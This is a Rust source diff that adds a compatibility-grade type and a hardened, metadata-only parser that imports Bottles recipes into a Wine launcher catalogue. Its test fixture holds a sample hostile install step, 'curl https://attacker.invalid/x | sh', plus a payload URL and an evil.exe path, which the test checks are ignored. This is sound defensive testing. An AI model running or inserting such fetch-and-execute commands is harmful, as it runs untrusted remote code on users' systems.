@@ -351,6 +351,47 @@ pub enum Provenance {
     User,
 }
 
+/// Bottles' compatibility grade, retained as explainable catalogue metadata.
+#[derive(Clone, Copy, Debug, Default, Eq, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
+#[serde(rename_all = "lowercase")]
+pub enum CompatibilityGrade {
+    Platinum,
+    Gold,
+    Silver,
+    Bronze,
+    Garbage,
+    #[default]
+    Unknown,
+}
+
+impl CompatibilityGrade {
+    /// Parse the grade labels used by Bottles recipes.
+    #[must_use]
+    pub fn parse(value: &str) -> Self {
+        match value.trim().to_ascii_lowercase().as_str() {
+            "platinum" => Self::Platinum,
+            "gold" => Self::Gold,
+            "silver" => Self::Silver,
+            "bronze" => Self::Bronze,
+            "garbage" | "borked" => Self::Garbage,
+            _ => Self::Unknown,
+        }
+    }
+
+    /// A short human explanation suitable for the route inspector.
+    #[must_use]
+    pub const fn explanation(self) -> &'static str {
+        match self {
+            Self::Platinum => "Runs without known compatibility changes.",
+            Self::Gold => "Runs with small, documented compatibility changes.",
+            Self::Silver => "Runs with notable compatibility changes.",
+            Self::Bronze => "Runs inconsistently or with substantial limitations.",
+            Self::Garbage => "The recipe is known not to work reliably.",
+            Self::Unknown => "No compatibility grade is available.",
+        }
+    }
+}
+
 impl Provenance {
     fn score(self) -> u8 {
         match self {
@@ -375,6 +416,9 @@ pub struct Record {
     /// this crate does not verify signatures or create a security boundary.
     #[serde(default)]
     pub signed: bool,
+    /// Optional compatibility grade from a Bottles recipe.
+    #[serde(default)]
+    pub compatibility_grade: Option<CompatibilityGrade>,
     #[serde(default)]
     pub matches: Vec<MatchKey>,
     pub recipe: Recipe,
@@ -473,6 +517,7 @@ pub struct LaunchPlan {
     pub settings: RunnerSettings,
     pub security_profile: SecurityProfileRef,
     pub proton_recipe: Option<String>,
+    pub compatibility_grade: Option<CompatibilityGrade>,
 }
 
 /// Why a catalogue record won.
@@ -714,6 +759,7 @@ pub fn proton_records_from_umu_csv(
                 version: RECORD_VERSION,
                 provenance: Provenance::Vendor,
                 signed: false,
+                compatibility_grade: None,
                 // STORE + CODENAME is the upstream product identity. Keep
                 // UMU_ID as a direct fallback for metadata discovered from
                 // the UMU launcher itself.
@@ -744,6 +790,377 @@ pub fn proton_records_from_umu_csv(
     }
     .validate()?;
     Ok(records)
+}
+
+/// Safe metadata extracted from one Bottles recipe program. Installer steps,
+/// URLs, paths and commands are intentionally absent from this type.
+#[derive(Clone, Debug, Eq, PartialEq)]
+pub struct BottlesProgram {
+    pub name: String,
+    pub executable: String,
+    pub architecture: Architecture,
+    pub grade: CompatibilityGrade,
+    pub dependencies: BTreeSet<String>,
+    pub dxvk: bool,
+    pub vkd3d: bool,
+    pub sync: Option<String>,
+}
+
+impl BottlesProgram {
+    /// Explain the imported grade and runner settings for the route inspector.
+    #[must_use]
+    pub fn explanation(&self) -> String {
+        let mut explanation = self.grade.explanation().to_owned();
+        if !self.dependencies.is_empty() {
+            explanation.push_str(" Components: ");
+            explanation.push_str(
+                &self
+                    .dependencies
+                    .iter()
+                    .cloned()
+                    .collect::<Vec<_>>()
+                    .join(", "),
+            );
+            explanation.push('.');
+        }
+        explanation
+    }
+}
+
+/// Parse the bounded, metadata-only subset of a Bottles recipe/index entry.
+///
+/// This is a deliberately small YAML reader for the stable public fields used
+/// by Bottles recipes. It does not attempt to interpret YAML tags, anchors, or
+/// installer instructions; unknown fields are ignored.
+///
+/// # Errors
+///
+/// Returns [`CatalogueError::InvalidBottlesRecipe`] for oversized, malformed,
+/// or metadata-free input.
+#[allow(
+    clippy::too_many_lines,
+    reason = "the bounded parser keeps its accepted field grammar together"
+)]
+pub fn parse_bottles_recipe(input: &str) -> Result<Vec<BottlesProgram>, CatalogueError> {
+    const MAX_BYTES: usize = 2 * 1024 * 1024;
+    const MAX_LINES: usize = 20_000;
+    if input.len() > MAX_BYTES {
+        return Err(CatalogueError::InvalidBottlesRecipe(
+            "input exceeds 2 MiB".to_owned(),
+        ));
+    }
+    let mut programs = Vec::new();
+    let mut defaults = BottlesBuilder::new("Bottles application");
+    let mut current: Option<BottlesBuilder> = None;
+    let mut programs_indent: Option<usize> = None;
+    let mut ignored_indent: Option<usize> = None;
+    let mut list_section: Option<(String, usize)> = None;
+    for (line_number, line) in input.lines().enumerate() {
+        if line_number >= MAX_LINES {
+            return Err(CatalogueError::InvalidBottlesRecipe(
+                "line count exceeds limit".to_owned(),
+            ));
+        }
+        if line.contains('\t') {
+            return Err(CatalogueError::InvalidBottlesRecipe(
+                "tabs are not supported".to_owned(),
+            ));
+        }
+        let indent = line.bytes().take_while(|byte| *byte == b' ').count();
+        let trimmed = line.trim();
+        if trimmed.is_empty() || trimmed.starts_with('#') {
+            continue;
+        }
+        if ignored_indent.is_some_and(|base| indent > base) {
+            continue;
+        }
+        ignored_indent = None;
+        let Some((raw_key, raw_value)) = trimmed.split_once(':') else {
+            if let Some((section, section_indent)) = &list_section
+                && indent > *section_indent
+                && trimmed.starts_with("- ")
+            {
+                if (section == "DEPENDENCIES" || section == "COMPONENTS")
+                    && let Some(value) = trimmed
+                        .get(2..)
+                        .and_then(|value| safe_yaml_scalar(value.trim()))
+                {
+                    if let Some(builder) = current.as_mut() {
+                        builder.dependencies.insert(value);
+                    } else {
+                        defaults.dependencies.insert(value);
+                    }
+                }
+                continue;
+            }
+            return Err(CatalogueError::InvalidBottlesRecipe(format!(
+                "line {} is not a key/value",
+                line_number.saturating_add(1)
+            )));
+        };
+        let key = raw_key.trim().to_ascii_uppercase();
+        let value = safe_yaml_scalar(raw_value.trim());
+        if matches!(
+            key.as_str(),
+            "STEPS" | "INSTALL" | "INSTALLATION" | "DOWNLOADS"
+        ) {
+            ignored_indent = Some(indent);
+            list_section = None;
+            continue;
+        }
+        if key == "PROGRAMS" {
+            programs_indent = Some(indent);
+            list_section = None;
+            continue;
+        }
+        if key == "DEPENDENCIES" || key == "COMPONENTS" {
+            list_section = Some((key, indent));
+            if let Some(value) = value {
+                if let Some(builder) = current.as_mut() {
+                    add_inline_dependencies(&mut builder.dependencies, &value);
+                } else {
+                    add_inline_dependencies(&mut defaults.dependencies, &value);
+                }
+            }
+            continue;
+        }
+        if programs_indent.is_some_and(|base| indent > base)
+            && value.is_none()
+            && !is_metadata_key(&key)
+        {
+            if let Some(builder) = current.take() {
+                programs.push(builder.finish()?);
+            }
+            let mut builder = defaults.clone();
+            raw_key.trim().clone_into(&mut builder.name);
+            current = Some(builder);
+            list_section = None;
+            continue;
+        }
+        if key == "EXECUTABLE" || key == "PROGRAM" || key == "EXE" {
+            if let Some(executable) = value.as_deref().and_then(safe_executable) {
+                if let Some(builder) = current.as_mut() {
+                    builder.executable = Some(executable.to_owned());
+                } else {
+                    let mut builder = defaults.clone();
+                    builder.executable = Some(executable.to_owned());
+                    current = Some(builder);
+                }
+            }
+            continue;
+        }
+        if let Some(builder) = current.as_mut() {
+            apply_bottles_field(builder, &key, value.as_deref());
+        } else {
+            apply_bottles_field(&mut defaults, &key, value.as_deref());
+        }
+    }
+    if let Some(builder) = current {
+        programs.push(builder.finish()?);
+    }
+    if programs.is_empty() {
+        return Err(CatalogueError::InvalidBottlesRecipe(
+            "no safe executable metadata found".to_owned(),
+        ));
+    }
+    Ok(programs)
+}
+
+/// Convert safe Bottles metadata into Wine records. Imported records are
+/// community provenance and unsigned until a trusted catalogue loader verifies
+/// the source.
+///
+/// # Errors
+///
+/// Returns an error if the recipe has no safe executable, contains malformed
+/// metadata, or the supplied runner/security profile fails validation.
+pub fn wine_records_from_bottles_recipe(
+    input: &str,
+    runner: &Runner,
+    security_profile: &SecurityProfileRef,
+) -> Result<Vec<Record>, CatalogueError> {
+    let programs = parse_bottles_recipe(input)?;
+    let records = programs
+        .into_iter()
+        .map(|program| {
+            let id = format!(
+                "bottles-{}",
+                bottles_slug(&program.name, &program.executable)
+            );
+            let mut graphics = BTreeMap::new();
+            graphics.insert("dxvk".to_owned(), program.dxvk.to_string());
+            graphics.insert("vkd3d".to_owned(), program.vkd3d.to_string());
+            if let Some(sync) = &program.sync {
+                graphics.insert("sync".to_owned(), sync.clone());
+            }
+            Ok(Record {
+                id,
+                version: RECORD_VERSION,
+                provenance: Provenance::Community,
+                signed: false,
+                compatibility_grade: Some(program.grade),
+                matches: vec![MatchKey {
+                    executable: Some(program.executable.clone()),
+                    ..MatchKey::default()
+                }],
+                recipe: Recipe {
+                    layer: Layer::Wine,
+                    runner: runner.clone(),
+                    settings: RunnerSettings {
+                        architecture: program.architecture,
+                        graphics,
+                        components: program.dependencies,
+                        ..RunnerSettings::default()
+                    },
+                    security_profile: security_profile.clone(),
+                    proton_recipe: None,
+                },
+            })
+        })
+        .collect::<Result<Vec<_>, CatalogueError>>()?;
+    Catalogue {
+        schema_version: CATALOGUE_SCHEMA_VERSION,
+        records: records.clone(),
+    }
+    .validate()?;
+    Ok(records)
+}
+
+#[derive(Clone, Debug)]
+struct BottlesBuilder {
+    name: String,
+    executable: Option<String>,
+    architecture: Architecture,
+    grade: CompatibilityGrade,
+    dependencies: BTreeSet<String>,
+    dxvk: bool,
+    vkd3d: bool,
+    sync: Option<String>,
+}
+
+impl BottlesBuilder {
+    fn new(name: &str) -> Self {
+        Self {
+            name: name.to_owned(),
+            executable: None,
+            architecture: Architecture::default(),
+            grade: CompatibilityGrade::default(),
+            dependencies: BTreeSet::new(),
+            dxvk: false,
+            vkd3d: false,
+            sync: None,
+        }
+    }
+
+    fn finish(self) -> Result<BottlesProgram, CatalogueError> {
+        let executable = self.executable.ok_or_else(|| {
+            CatalogueError::InvalidBottlesRecipe("program has no safe executable".to_owned())
+        })?;
+        Ok(BottlesProgram {
+            name: self.name,
+            executable,
+            architecture: self.architecture,
+            grade: self.grade,
+            dependencies: self.dependencies,
+            dxvk: self.dxvk,
+            vkd3d: self.vkd3d,
+            sync: self.sync,
+        })
+    }
+}
+
+fn is_metadata_key(key: &str) -> bool {
+    matches!(
+        key,
+        "NAME" | "SLUG" | "ARCH" | "ARCHITECTURE" | "GRADE" | "DXVK" | "VKD3D" | "SYNC"
+    )
+}
+
+fn safe_yaml_scalar(value: &str) -> Option<String> {
+    let value = value.trim();
+    if value.is_empty() {
+        return None;
+    }
+    let value = value
+        .strip_prefix('"')
+        .and_then(|value| value.strip_suffix('"'))
+        .or_else(|| {
+            value
+                .strip_prefix('\'')
+                .and_then(|value| value.strip_suffix('\''))
+        })
+        .unwrap_or(value)
+        .trim();
+    if value.is_empty() || value.len() > 512 || value.chars().any(char::is_control) {
+        return None;
+    }
+    Some(value.to_owned())
+}
+
+fn safe_executable(value: &str) -> Option<&str> {
+    let value = value.trim();
+    if value.is_empty()
+        || value.len() > 255
+        || value.chars().any(char::is_control)
+        || value.contains('/')
+        || value.contains('\\')
+        || value.contains(':')
+        || value.starts_with('.')
+        || value.contains("..")
+        || !(value.to_ascii_lowercase().ends_with(".exe")
+            || value.to_ascii_lowercase().ends_with(".com"))
+    {
+        return None;
+    }
+    Some(value)
+}
+
+fn apply_bottles_field(builder: &mut BottlesBuilder, key: &str, value: Option<&str>) {
+    let Some(value) = value else { return };
+    match key {
+        "NAME" if builder.name == "Bottles application" => value.clone_into(&mut builder.name),
+        "ARCH" | "ARCHITECTURE" => {
+            builder.architecture =
+                if value.eq_ignore_ascii_case("win32") || value.eq_ignore_ascii_case("32bit") {
+                    Architecture::Win32
+                } else {
+                    Architecture::Win64
+                };
+        }
+        "GRADE" => builder.grade = CompatibilityGrade::parse(value),
+        "DXVK" => builder.dxvk = parse_bool(value),
+        "VKD3D" => builder.vkd3d = parse_bool(value),
+        "SYNC" => builder.sync = safe_yaml_scalar(value),
+        _ => {}
+    }
+}
+
+fn add_inline_dependencies(target: &mut BTreeSet<String>, value: &str) {
+    let value = value.trim().trim_start_matches('[').trim_end_matches(']');
+    for component in value.split(',') {
+        if let Some(component) = safe_yaml_scalar(component) {
+            target.insert(component);
+        }
+    }
+}
+
+fn parse_bool(value: &str) -> bool {
+    matches!(
+        value.trim().to_ascii_lowercase().as_str(),
+        "true" | "yes" | "on" | "1"
+    )
+}
+
+fn bottles_slug(name: &str, executable: &str) -> String {
+    let mut slug = String::new();
+    for character in format!("{name}-{executable}").chars() {
+        if character.is_ascii_alphanumeric() {
+            slug.push(character.to_ascii_lowercase());
+        } else if !slug.ends_with('-') {
+            slug.push('-');
+        }
+    }
+    slug.trim_matches('-').to_owned()
 }
 
 fn parse_csv_rows(input: &str) -> Result<Vec<Vec<String>>, CatalogueError> {
@@ -880,6 +1297,7 @@ fn plan_from_record(record: &Record, kind: MatchKind) -> LaunchPlan {
         settings: record.recipe.settings.clone(),
         security_profile: record.recipe.security_profile.clone(),
         proton_recipe: record.recipe.proton_recipe.clone(),
+        compatibility_grade: record.compatibility_grade,
     }
 }
 
@@ -892,6 +1310,7 @@ fn default_wine_plan() -> LaunchPlan {
         settings: RunnerSettings::default(),
         security_profile: SecurityProfileRef(String::from("windows-app")),
         proton_recipe: None,
+        compatibility_grade: None,
     }
 }
 
@@ -1125,6 +1544,8 @@ pub enum CatalogueError {
     UmuMetadataEmpty,
     #[error("invalid UMU CSV: {0}")]
     InvalidUmuCsv(String),
+    #[error("invalid Bottles recipe: {0}")]
+    InvalidBottlesRecipe(String),
 }
 
 #[cfg(test)]
@@ -1141,6 +1562,7 @@ mod tests {
             version: 1,
             provenance: Provenance::BuiltIn,
             signed: false,
+            compatibility_grade: None,
             matches: vec![key],
             recipe: Recipe {
                 layer: Layer::Wine,
@@ -1472,5 +1894,51 @@ mod tests {
             resolver.resolve(&gog, VmFallback::Disabled).match_kind,
             MatchKind::StoreProduct
         );
+    }
+
+    #[test]
+    fn imports_safe_bottles_metadata_and_ignores_steps_paths_and_urls() {
+        let recipe = r"
+Name: Evernote
+Arch: win64
+Grade: Gold
+DXVK: true
+VKD3D: false
+Sync: fsync
+Dependencies:
+  - corefonts
+  - dotnet48
+Programs:
+  Evernote:
+    Executable: Evernote.exe
+Steps:
+  - executable: /tmp/evil.exe
+  - command: curl https://attacker.invalid/x | sh
+  - url: https://attacker.invalid/payload
+";
+        let programs = parse_bottles_recipe(recipe).expect("valid Evernote recipe");
+        assert_eq!(programs.len(), 1);
+        assert_eq!(programs[0].executable, "Evernote.exe");
+        assert_eq!(programs[0].grade, CompatibilityGrade::Gold);
+        assert!(programs[0].dependencies.contains("corefonts"));
+        assert!(programs[0].dxvk);
+        assert_eq!(programs[0].sync.as_deref(), Some("fsync"));
+        assert!(!programs[0].explanation().contains("attacker"));
+        let runner = Runner::new("wine", "11").expect("valid runner");
+        let profile = profile();
+        let records = wine_records_from_bottles_recipe(recipe, &runner, &profile)
+            .expect("valid Wine records");
+        assert_eq!(records[0].provenance, Provenance::Community);
+        assert_eq!(
+            records[0].compatibility_grade,
+            Some(CompatibilityGrade::Gold)
+        );
+        assert_eq!(records[0].recipe.settings.components.len(), 2);
+    }
+
+    #[test]
+    fn rejects_bottles_path_as_an_executable() {
+        let recipe = "Name: Bad\nExecutable: /home/user/evil.exe\n";
+        assert!(parse_bottles_recipe(recipe).is_err());
     }
 }
